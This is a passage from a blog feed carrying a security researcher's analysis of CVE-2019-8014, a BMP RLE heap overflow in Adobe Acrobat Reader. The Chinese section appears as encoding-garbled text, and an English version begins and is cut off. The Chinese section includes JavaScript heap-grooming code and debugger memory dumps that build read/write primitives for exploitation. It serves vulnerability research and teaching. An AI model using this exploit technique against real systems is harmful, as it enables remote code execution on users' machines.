ArrayBuffer â”‚ Bitmap Data â”‚ ArrayBuffer â”‚     Hole    â”‚</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br></pre></td></tr></table></figure><p>å› ä¸ºå¯ä»¥å‘ä½åœ°å€æ–¹å‘è¶Šç•Œå†™ <code>0xF4</code> å­—èŠ‚çš„ <code>0x10</code> æ•°æ®ï¼Œæ‰€ä»¥è§¦å‘æ¼æ´ä¹‹åï¼Œ<code>ArrayBuffer</code> å¯¹è±¡çš„ <strong>backing store</strong> çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 304c8398</span><br><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">304c8398  00000000 10101010 10101010 10101010</span><br><span class="line">;         ArrayBuffer æ•°æ®</span><br><span class="line">304c83a8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83b8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83c8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83d8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83e8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83f8  10101010 10101010 10101010 10101010</span><br><span class="line">304c8408  10101010 10101010 10101010 10101010</span><br><span class="line">304c8418  10101010 10101010 10101010 10101010</span><br><span class="line">304c8428  10101010 10101010 10101010 10101010</span><br><span class="line">304c8438  10101010 10101010 10101010 10101010</span><br><span class="line">304c8448  10101010 10101010 10101010 10101010</span><br><span class="line">304c8458  10101010 10101010 10101010 10101010</span><br><span class="line">304c8468  10101010 10101010 10101010 10101010</span><br><span class="line">304c8478  10101010 10101010 10101010 10101010 ; ArrayBuffer ç»“æŸ</span><br><span class="line">; ä¸‹ä¸€ä¸ªå †å—çš„å…ƒæ•°æ®ï¼ˆå­˜å‚¨ä½å›¾æ•°æ®çš„å †å—ï¼‰</span><br><span class="line">304c8488  10101010 10101010</span><br><span class="line">; ä½å›¾æ•°æ®</span><br><span class="line">304c8490                    00000000 00000000</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ <code>ArrayBuffer</code> å¯¹è±¡çš„ <code>byteLength</code> è¢«æ”¹æˆäº† <code>0x10101010</code> ï¼Œä½†æ˜¯ <code>DataView</code> å¯¹è±¡çš„æŒ‡é’ˆä¹Ÿè¢«æ”¹æˆäº† <code>0x10101010</code> ï¼Œå‰é¢æåˆ°è¿‡è¿™ä¼šå¯¼è‡´è¿›ç¨‹å´©æºƒã€‚</p><h4 id="5-5-2-å†…å­˜å¸ƒå±€-0"><a href="#5-5-2-å†…å­˜å¸ƒå±€-0" class="headerlink" title="5.5.2 å†…å­˜å¸ƒå±€ (0)"></a>5.5.2 å†…å­˜å¸ƒå±€ (0)</h4><p>ä¸ºäº†é¿å…è¿›ç¨‹å´©æºƒï¼Œéœ€è¦æå‰åœ¨åœ°å€ <code>0x10101010</code> ä¸Šå¸ƒå±€æ•°æ®ï¼Œè®©è¿™ä¸ªåœ°å€çœ‹èµ·æ¥å°±æ˜¯ä¸€ä¸ª <code>DataView</code> æŒ‡é’ˆã€‚å¾ˆæ˜æ˜¾ï¼Œä¸ºäº†æ¼æ´åˆ©ç”¨æ›´åŠ ç¨³å®šï¼Œæˆ‘ä»¬éœ€è¦ä¸€å¼€å§‹å°±åœ¨è¿™é‡Œå¸ƒå±€å¥½æ•°æ®ã€‚</p><p>åŒæ ·ï¼Œè¿™é‡Œå€ŸåŠ© <code>ArrayBuffer</code> å®ç°ç²¾ç¡®çš„å†…å­˜å¸ƒå±€ï¼š</p><ul><li>åˆ›å»ºå¤§é‡ <code>byteLength</code> ä¸º <code>0xFFE8</code> çš„ <code>ArrayBuffer</code> </li><li>åœ¨ç‰¹å®šå†…å­˜èŒƒå›´å†…ï¼Œ<code>ArrayBuffer</code> çš„ <strong>backing store</strong> å°†æœ‰åºçš„å‡ºç°åœ¨åœ°å€ <code>0xYYYY0048</code> ä¸Š</li></ul><p>ä¹‹æ‰€ä»¥é€‰æ‹© <code>0xFFE8</code> ï¼Œæ˜¯å› ä¸ºè¿™ä¼šä½¿å¾— <strong>backing store</strong> æ‰€åœ¨å †å—æ•´ä½“çš„å¤§å°ä¸º <code>0x10000</code> ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0xFFE8 -&gt; byteLength</span></span><br><span class="line"><span class="comment">// 0x10 -&gt; sizeof ObjectElements</span></span><br><span class="line"><span class="comment">// 0x08 -&gt; sizeof heap block's metadata</span></span><br><span class="line"><span class="number">0xFFE8</span> + <span class="number">0x10</span> + <span class="number">0x08</span> = <span class="number">0x10000</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸‹é¢çš„ä»£ç è¿›è¡Œå†…å­˜å¸ƒå±€ï¼Œå¯ä»¥æœ‰æ•ˆé˜²æ­¢è¿›ç¨‹å´©æºƒï¼ˆå…·ä½“ç»†èŠ‚ä¸ä½œè®²è§£ï¼Œç›¸å…³æ¡ä»¶å¾ˆå®¹æ˜“é€šè¿‡åŠ¨æ€è°ƒè¯•åˆ†æå‡ºæ¥ï¼‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    </span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &amp;lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œè¿™ä»…ä»…åªèƒ½é˜²æ­¢æ¼æ´è§¦å‘åè¿›ç¨‹çš„å´©æºƒï¼Œå¦‚æœè¦ä¸ºè¯¥ <code>ArrayBuffer</code> å…³è”æ–°çš„ <code>DataView</code> æ¥è¯»å†™æ•°æ®ï¼Œé‚£ä¹ˆä¼šå¯¼è‡´æ–°çš„å´©æºƒã€‚åŒæ ·ï¼Œå¡«å……ä¸€ç‚¹æ–°çš„æ•°æ®å°±å¯ä»¥é˜²æ­¢è¿›ç¨‹å´©æºƒï¼Œæ–°çš„ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// é˜²æ­¢è§¦å‘æ¼æ´ä¹‹åè¿›ç¨‹ç«‹åˆ» Crash</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// é˜²æ­¢å…³è” DataView å¯¹è±¡æ—¶ Crash</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFFA4</span>, <span class="number">0x10100458</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &amp;lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-5-3-å…¨å±€è¯»å†™"><a href="#5-5-3-å…¨å±€è¯»å†™" class="headerlink" title="5.5.3 å…¨å±€è¯»å†™"></a>5.5.3 å…¨å±€è¯»å†™</h4><p>å½“ <code>ArrayBuffer</code> å¯¹è±¡çš„ <code>byteLength</code> è¢«æ”¹æˆ <code>0x10101010</code> ä¹‹åï¼Œå¯ä»¥åŸºäºè¿™ä¸ª <code>ArrayBuffer</code> å¯¹è±¡ä¿®æ”¹ä¸‹ä¸€ä¸ª <code>ArrayBuffer</code> å¯¹è±¡çš„ <code>byteLength</code> ã€‚åœ¨åŸºäº <code>ArrayBuffer</code> åˆ›å»ºå†…å­˜ç©ºæ´æ—¶ï¼Œå¯ä»¥åœ¨æ¯ä¸€ä¸ª <code>ArrayBuffer</code> ä¸Šå­˜å‚¨ç‰¹å®šçš„æ ‡è®°å€¼ï¼Œè¿™æ ·åœ¨å†…å­˜ä¸­æœç´¢ <code>ArrayBuffer</code> å¯¹è±¡å°±éå¸¸ç®€å•äº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  (1)byteLength            (3)Global Access</span><br><span class="line"> â”Œâ”€&lt;â”€â”€â”€&lt;â”€â”€â”€&lt;â”€â”€â”€â”            &lt;â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€&gt;</span><br><span class="line">â”Œâ”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="line">â”‚ ArrayBuffer â”‚ Bitmap Data â”‚ ArrayBuffer â”‚     Hole    â”‚</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="line">       â””â”€â”€&gt;â”€â”€â”€&gt;â”€â”€â”€&gt;â”€â”€â”€&gt;â”€â”€â”€â”€&gt;â”€â”˜</span><br><span class="line">        (2) byteLength to -1</span><br></pre></td></tr></table></figure><p>å½“ä¸‹ä¸€ä¸ª <code>ArrayBuffer</code> å¯¹è±¡çš„ <code>byteLength</code> è¢«æ”¹æˆ <code>0xFFFFFFFF</code> æ—¶ï¼ŒåŸºäºè¿™ä¸ª <code>ArrayBuffer</code> å¯¹è±¡å°±å¯ä»¥å®ç°ç”¨æˆ·æ€ç©ºé—´çš„å…¨å±€è¯»å†™äº†ã€‚</p><h4 id="5-5-4-ä»»æ„åœ°å€è¯»å†™"><a href="#5-5-4-ä»»æ„åœ°å€è¯»å†™" class="headerlink" title="5.5.4 ä»»æ„åœ°å€è¯»å†™"></a>5.5.4 ä»»æ„åœ°å€è¯»å†™</h4><p>ä¸€æ—¦æ‹¥æœ‰å…¨å±€è¯»å†™çš„èƒ½åŠ›ï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘ä½åœ°å€æ–¹å‘æ¥æœç´¢ç‰¹å®šçš„å…³é”®å­—æ¥å®šä½ <code>ArrayBuffer</code> å¯¹è±¡åœ¨å†…å­˜ä¸­çš„ç»å¯¹åœ°å€ï¼Œç„¶ååŸºäºè¿™ä¸ªç»å¯¹åœ°å€æ¥å®ç°ä»»æ„åœ°å€è¯»å†™ã€‚</p><p>è¿™é‡Œå¯ä»¥é€šè¿‡æœç´¢ <code>ffeeffee</code> æˆ–è€… <code>f0e0d0c0</code> æ¥å®šä½ï¼Œä¸ºäº†æé«˜å‡†ç¡®æ€§ï¼Œéœ€è¦åŒæ—¶æ ¡éªŒå…³é”®å­—é™„è¿‘çš„æ•°æ®çš„å–å€¼èŒƒå›´ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 30080000</span><br><span class="line">30080000  16b80e9e 0101331b ffeeffee 00000002  ; ffeeffee</span><br><span class="line">30080010  055a00a4 2f0b0010 055a0000 30080000  ; +0x14 -&gt; 30080000</span><br><span class="line">30080020  00000fcf 30080040 3104f000 000002e5</span><br><span class="line">30080030  00000001 00000000 30d69ff0 30d69ff0</span><br><span class="line">30080040  3eb82e96 08013313 00000000 0000ffe8</span><br><span class="line">30080050  00000000 00000000 10100158 00000000</span><br><span class="line">30080060  00000000 00000000 00000000 00000000</span><br><span class="line">30080070  00000000 00000000 00000000 00000000</span><br><span class="line"></span><br><span class="line">0:014&gt; dd 305f4000</span><br><span class="line">305f4000  00000000 00000000 6ab08d69 0858b71a</span><br><span class="line">305f4010  0bbab388 30330080 0ff00112 f0e0d0c0  ; f0e0d0c0</span><br><span class="line">305f4020  15dc2c3f 00000430 305f402c d13bc929  ; +0x0C -&gt; 305f402c</span><br><span class="line">305f4030  e5c521a7 d9b264d4 919cee58 45da954e</span><br><span class="line">305f4040  5c3f608b 2b5fd340 0bae3aa9 2b5fd340</span><br><span class="line">305f4050  0fae32aa d13bc929 e5c521a7 d9b264d4</span><br><span class="line">305f4060  919cee58 45da954e 9c3f608b f952aa94</span><br><span class="line">305f4070  989c772a a1dd934a ac5b154b 2fadd038</span><br></pre></td></tr></table></figure><h4 id="5-5-5-å‰©ä½™æ­¥éª¤"><a href="#5-5-5-å‰©ä½™æ­¥éª¤" class="headerlink" title="5.5.5 å‰©ä½™æ­¥éª¤"></a>5.5.5 å‰©ä½™æ­¥éª¤</h4><p>åœ¨æ‹¥æœ‰ä»»æ„åœ°å€è¯»å†™èƒ½åŠ›ä¹‹åï¼Œå®ç°ä»£ç æ‰§è¡Œå°±æ˜¯å›ºå®šçš„å¥—è·¯äº†ï¼Œæœ¬æ–‡å¯¹æ­¤ä¸åšè¯¦ç»†ä»‹ç»ã€‚</p><p>å‰©ä½™çš„æ­¥éª¤å¦‚ä¸‹ï¼š</p><ul><li>EIP åŠ«æŒ</li><li>ASLR ç»•è¿‡</li><li>DEP ç»•è¿‡</li><li>CFG ç»•è¿‡</li></ul><h2 id="0x06-CVE-2013-2729"><a href="#0x06-CVE-2013-2729" class="headerlink" title="0x06. CVE-2013-2729"></a>0x06. CVE-2013-2729</h2><p>å‰é¢æåˆ°ä¸€å…±æ‰¾åˆ°äº†ä¸‰å¤„æ•´æ•°æº¢å‡ºï¼Œå…¶ä¸­ä¸€å¤„ä½äº RLE8 æ•°æ®è§£æè¿‡ç¨‹ä¸­ï¼Œå¦å¤–ä¸¤å¤„ä½äº RLE4 æ•°æ®è§£æè¿‡ç¨‹ä¸­ã€‚éš¾é“ä¸åº”è¯¥æœ‰å››ä¸ªä½ç½®å­˜åœ¨æ•´æ•°æº¢å‡ºå—ï¼Ÿä¸ºä»€ä¹ˆåªæ‰¾åˆ°äº†ä¸‰ä¸ªï¼Ÿ</p><p>å› ä¸ºæœ‰ä¸€ä¸ªåœ¨å…­å¹´å‰å·²ç»ä¿®å¤äº†ï¼ˆå‚è€ƒ <a href="http://blog.binamuse.com/2013/05/readerbmprle.html" target="_blank" rel="noopener">feliamâ€™s write up for CVE-2013-2729</a>ï¼‰ï¼ä»ç‰ˆæœ¬ <code>2019.012.20035</code> ä¸­çš„ä»£ç ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œç¡®å®æœ‰ä¸€ä¸ªåœ°æ–¹åˆ¤æ–­äº†æ•´æ•°æº¢å‡ºçš„æƒ…å†µï¼Œè¿™å°±æ˜¯ CVE-2013-2729 å¼•å…¥çš„è¡¥ä¸ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dst_xpos = BYTE1(cmd) + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &lt; xpos || </span><br><span class="line">     dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  <span class="comment">// overflow check</span></span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;         <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>ç„¶è€Œ Adobe ä»…ä»…ä¿®è¡¥äº†æŠ¥å‘Šçš„è¿™ä¸€ä¸ªä½ç½®ï¼Œè€Œå¿½ç•¥äº†å…¶ä»–ä¸‰ä¸ªä½ç½®ä¸Šçš„æ•´æ•°æº¢å‡ºã€‚</p><h2 id="0x07-ç»éªŒæ•™è®­"><a href="#0x07-ç»éªŒæ•™è®­" class="headerlink" title="0x07. ç»éªŒæ•™è®­"></a>0x07. ç»éªŒæ•™è®­</h2><p>å¯¹å‚å•†è€Œè¨€ï¼Œåœ¨æ·±å…¥ç†è§£æ¼æ´æœ¬è´¨çš„åŒæ—¶ï¼Œè¿˜å¯ä»¥çœ‹çœ‹æ˜¯ä¸æ˜¯æœ‰ç±»ä¼¼çš„é—®é¢˜éœ€è¦ä¿®å¤ã€‚</p><p>å¯¹å®‰å…¨ç ”ç©¶äººå‘˜è€Œè¨€ï¼Œåˆ†æå®Œæ¼æ´ä¹‹åè¿˜å¯ä»¥é¡ºä¾¿çœ‹ä¸€ä¸‹å‚å•†çš„ä¿®å¤æ–¹å¼ï¼Œä¹Ÿè®¸ä¸ç»æ„é—´å°±èƒ½å‘ç°æ–°çš„æ¼æ´ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;em&gt;æœ¬æ–‡è¯¦ç»†åˆ†æäº† Adobe Acrobat Reader / Pro DC ä¸­è¿‘æœŸä¿®å¤çš„å®‰å…¨æ¼æ´ CVE-2019-8014 ã€‚æœ‰è¶£çš„æ˜¯ï¼ŒAdobe åœ¨å…­å¹´å‰ &lt;strong&gt;&lt;del&gt;ä¿®å¤&lt;/del&gt;&lt;/strong&gt; äº†ä¸€ä¸ªç±»ä¼¼çš„æ¼æ´ CVE-2013-2729 ï¼Œæ­£æ˜¯ç”±äºå¯¹è¯¥æ¼æ´çš„ä¿®å¤ä¸å¤Ÿå®Œå–„ï¼Œæ‰ä½¿å¾— CVE-2019-8014 é—ç•™äº†é•¿è¾¾å…­å¹´ä¹‹ä¹…ã€‚æœ¬æ–‡åŒæ—¶è®¨è®ºäº†å¦‚ä½•ä¸ºæ­¤ç±»æ¼æ´ç¼–å†™åˆ©ç”¨ä»£ç ã€‚&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;æœ¬æ–‡ä½œè€…ï¼š&lt;strong&gt;Ke Liu of Tencent Security Xuanwu Lab&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="http://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="BMP" scheme="http://programlife.net/tags/BMP/"/>
    
      <category term="Adobe Reader" scheme="http://programlife.net/tags/Adobe-Reader/"/>
    
      <category term="PDF" scheme="http://programlife.net/tags/PDF/"/>
    
      <category term="CVE-2019-8014" scheme="http://programlife.net/tags/CVE-2019-8014/"/>
    
      <category term="CVE-2013-2729" scheme="http://programlife.net/tags/CVE-2013-2729/"/>
    
      <category term="XFA" scheme="http://programlife.net/tags/XFA/"/>
    
      <category term="RLE" scheme="http://programlife.net/tags/RLE/"/>
    
  </entry>
  
  <entry>
    <title>Deep Analysis of CVE-2019-8014 The Vulnerability Ignored 6 Years Ago</title>
    <link href="http://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-en/"/>
    <id>http://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-en/</id>
    <published>2019-09-12T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p><em>This post provides detailed analysis for CVE-2019-8014 which was fixed in Adobe Acrobat Reader / Pro DC recently. Interestingly, itâ€™s a patch bypass of CVE-2013-2729 which was <del><strong>fixed</strong></del> six years ago. This post also discusses how to exploit the vulnerability.</em></p><p>Author: <strong>Ke Liu of Tencent Security Xuanwu Lab</strong></p><a id="more"></a><h2 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h2><p>Adobe released security updates for Adobe Acrobat and Reader in <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html" target="_blank" rel="noopener">APSB19-41</a> in August. As usual, lots of vulnerabilities were fixed in the updates. When I was reviewing the corresponding advisories on <a href="https://www.zerodayinitiative.com/advisories/published/" target="_blank" rel="noopener">ZDI</a> , my attention was attracted by one of them: <a href="https://www.zerodayinitiative.com/advisories/ZDI-19-725/" target="_blank" rel="noopener">ZDI-19-725</a> / <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8014" target="_blank" rel="noopener">CVE-2019-8014</a> . Following text is the title and description of this case:</p><blockquote><p>Adobe Acrobat Pro DC AcroForm Bitmap File Parsing Heap-based Buffer Overflow Remote Code Execution Vulnerability</p><p>The specific flaw exists within the parsing of run length encoding in BMP images. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length, heap-based buffer. An attacker can leverage this vulnerability to execute code in the context of the current process.</p></blockquote><p>What surprised me most is that the flaw exists within the parsing of run length encoding in BMP images because I remembered that six years ago a similar case <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2729" target="_blank" rel="noopener">CVE-2013-2729</a> was fixed in Adobe Reader. If you have the same wondering that whatâ€™s the relationship between CVE-2013-2729 and CVE-2019-8014, then let me reveal the truth for you.</p><p>By the way, the credit of CVE-2019-8014 goes to <code>ktkitty (https://ktkitty.github.io)</code> .</p><h2 id="0x02-Debugging-Environment"><a href="#0x02-Debugging-Environment" class="headerlink" title="0x02. Debugging Environment"></a>0x02. Debugging Environment</h2><p>Before diving deep into the details of the vulnerability, letâ€™s set up the debugging environment first. According to <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html" target="_blank" rel="noopener">APSB19-41</a> , <code>2019.012.20035</code> and earlier versionsâ€¯of Adobe Acrobat and Reader on Windows were affected, and the released version was <code>2019.012.20036</code> . Weâ€™ll carry out our analysis on these two versions.</p><p>Steps to install Adobe Acrobat Reader DC <code>2019.012.20035</code> :</p><ol><li>Download and install <code>2019.012.20034</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220034/" target="_blank" rel="noopener">Download Link</a>)</li><li>Upgrade to <code>2019.012.20035</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220035/" target="_blank" rel="noopener">Download Link</a>)</li></ol><p>Steps to install Adobe Acrobat Reader DC <code>2019.012.20036</code> :</p><ol><li>Download and install <code>2019.012.20036</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220036/" target="_blank" rel="noopener">Download Link</a>)</li></ol><p>Please remember to disconnect the Internet or disable the <em>Adobe Acrobat Update Service</em> , otherwise your Adobe Acrobat Reader DC will be updated automatically.</p><h2 id="0x03-Bitmap-Structures"><a href="#0x03-Bitmap-Structures" class="headerlink" title="0x03. Bitmap Structures"></a>0x03. Bitmap Structures</h2><p>Again, before diving deep into the details of the vulnerability, letâ€™s learn some essential concepts of bitmap images. You can skip this section if youâ€™re already familiar with it.</p><h3 id="3-1-Structures"><a href="#3-1-Structures" class="headerlink" title="3.1 Structures"></a>3.1 Structures</h3><p>Generally speaking, a bitmap image is composed of four parts:</p><ol><li>Bitmap File Header</li><li>Bitmap Info Header</li><li>RGBQUAD Array</li><li>Bitmap Data</li></ol><h4 id="3-1-1-Bitmap-File-Header"><a href="#3-1-1-Bitmap-File-Header" class="headerlink" title="3.1.1 Bitmap File Header"></a>3.1.1 Bitmap File Header</h4><p>The <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-bitmapfileheader" target="_blank" rel="noopener">BITMAPFILEHEADER</a></strong> structure contains information about the type, size, and layout of the bitmap file. Following is the definition of this structure:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPFILEHEADER</span> &#123;</span></span><br><span class="line">  WORD  bfType;         <span class="comment">// 'BM'</span></span><br><span class="line">  DWORD bfSize;         <span class="comment">// size of the bitmap file</span></span><br><span class="line">  WORD  bfReserved1;    <span class="comment">// 0</span></span><br><span class="line">  WORD  bfReserved2;    <span class="comment">// 0</span></span><br><span class="line">  DWORD bfOffBits;      <span class="comment">// offset of the bitmap bits</span></span><br><span class="line">&#125; BITMAPFILEHEADER, *LPBITMAPFILEHEADER, *PBITMAPFILEHEADER;</span><br></pre></td></tr></table></figure><h4 id="3-1-2-Bitmap-Info-Header"><a href="#3-1-2-Bitmap-Info-Header" class="headerlink" title="3.1.2 Bitmap Info Header"></a>3.1.2 Bitmap Info Header</h4><p>The <strong><a href="https://docs.microsoft.com/en-us/previous-versions/dd183376(v=vs.85" target="_blank" rel="noopener">BITMAPINFOHEADER</a>)</strong> structure contains information about the dimensions and color format of the bitmap file. Following is the definition of this structure:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPINFOHEADER</span> &#123;</span></span><br><span class="line">  DWORD biSize;             <span class="comment">// sizeof(BITMAPINFOHEADER)</span></span><br><span class="line">  LONG  biWidth;            <span class="comment">// bitmap width</span></span><br><span class="line">  LONG  biHeight;           <span class="comment">// bitmap height</span></span><br><span class="line">  WORD  biPlanes;           <span class="comment">// must be 1</span></span><br><span class="line">  WORD  biBitCount;         <span 